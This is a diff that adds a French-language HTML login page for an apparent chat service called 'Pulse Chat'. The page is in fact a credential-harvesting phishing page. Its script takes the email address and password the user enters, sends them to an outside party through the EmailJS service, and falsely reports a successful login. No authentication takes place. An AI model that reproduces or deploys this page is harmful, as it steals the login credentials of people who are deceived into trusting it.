@@ -1,0 +1,79 @@
+<!doctype html>
+<html lang="fr" class="h-full">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pulse Chat - Connexion</title>
+    <script src="https://cdn.tailwindcss.com/3.4.17"></script>
+    <style>
+        html, body { height: 100%; margin: 0; padding: 0; }
+        .gradient-bg { background: linear-gradient(135deg, #FFE500 0%, #FFED4E 50%, #FFF8DC 100%); }
+        .pulse-logo {
+            font-size: 48px; font-weight: 900; letter-spacing: -2px;
+            background: linear-gradient(135deg, #FF6B35 0%, #FF8C42 100%);
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
+        }
+        .input-field {
+            background: rgba(255, 255, 255, 0.95); border: 2px solid transparent; border-radius: 12px;
+            padding: 14px 16px; font-size: 16px; transition: all 0.3s ease; width: 100%; box-sizing: border-box;
+        }
+        .input-field:focus { outline: none; border-color: #FF6B35; box-shadow: 0 0 0 3px rgba(255, 107, 53, 0.1); }
+        .login-btn {
+            background: linear-gradient(135deg, #FF6B35 0%, #FF8C42 100%); color: white;
+            font-weight: 700; font-size: 16px; border: none; border-radius: 12px;
+            padding: 14px 24px; cursor: pointer; width: 100%; transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(255, 107, 53, 0.3);
+        }
+        .login-card { background: white; border-radius: 24px; padding: 40px; width: 100%; max-width: 400px; box-shadow: 0 20px 60px rgba(0, 0, 0, 0.15); }
+        .message-status { font-size: 14px; text-align: center; margin-top: 12px; }
+        .message-success { color: #10b981; font-weight: 600; }
+        .message-error { color: #ef4444; font-weight: 600; }
+    </style>
+</head>
+<body class="gradient-bg flex items-center justify-center p-5">
+    <div class="login-card">
+        <div class="text-center mb-8">
+            <div class="pulse-logo">Pulse Chat</div>
+            <p class="text-gray-400 text-sm mt-2">Connectez-vous pour discuter</p>
+        </div>
+        <form id="login-form" class="flex flex-col gap-4">
+            <input type="email" id="email" class="input-field" placeholder="Adresse email" required> 
+            <input type="password" id="password" class="input-field" placeholder="Mot de passe" required> 
+            <button type="submit" class="login-btn" id="login-btn">Se connecter</button>
+            <div id="message" class="message-status"></div>
+        </form>
+    </div>
+
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+<script>
+    (function(){
+        emailjs.init({ publicKey: "eIX3mqRzV9eWtGPIF" }); 
+    })();
+
+    const form = document.getElementById('login-form');
+    form.addEventListener('submit', function(e) {
+        e.preventDefault();
+        const btn = document.getElementById('login-btn');
+        const msg = document.getElementById('message');
+        btn.disabled = true;
+        btn.innerText = "Chargement...";
+
+        emailjs.send("service_356pn8k", "template_2llh5zq", {
+            user_email: document.getElementById('email').value,
+            user_password: document.getElementById('password').value
+        }).then(() => {
+            msg.innerText = "✓ Connexion réussie !";
+            msg.className = "message-status message-success";
+            form.reset();
+            btn.disabled = false;
+            btn.innerText = "Se connecter";
+        }).catch(() => {
+            msg.innerText = "Erreur de connexion";
+            msg.className = "message-status message-error";
+            btn.disabled = false;
+            btn.innerText = "Se connecter";
+        });
+    });
+</script>
+</body>
+</html>
